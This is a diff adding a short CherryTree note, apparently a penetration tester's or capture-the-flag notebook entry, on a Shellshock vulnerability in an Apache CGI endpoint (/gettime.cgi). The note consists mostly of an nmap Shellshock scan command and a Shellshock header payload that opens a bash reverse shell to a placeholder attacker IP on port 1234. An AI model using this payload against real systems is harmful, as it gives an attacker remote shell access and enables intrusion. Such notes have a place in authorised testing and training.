@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="51" master_id="0" name="Apache" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730895422" ts_lastsave="1730895433">
+    <rich_text>shellshock vuln
+
+
+todo: /gettime.cgi</rich_text>
+    <codebox char_offset="17" justification="left" frame_width="556" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">
+nmap --script=httpshellshock --script-args "http-shellshock.uri=/gettime.cgi"
+
+() { : ; }; echo; echo; /bin/bash -c 'bash -i&gt;&amp;/dev/tcp/**hacker_ip**/1234 0&gt;&amp;1'
+</codebox>
+  </node>
+</cherrytree>
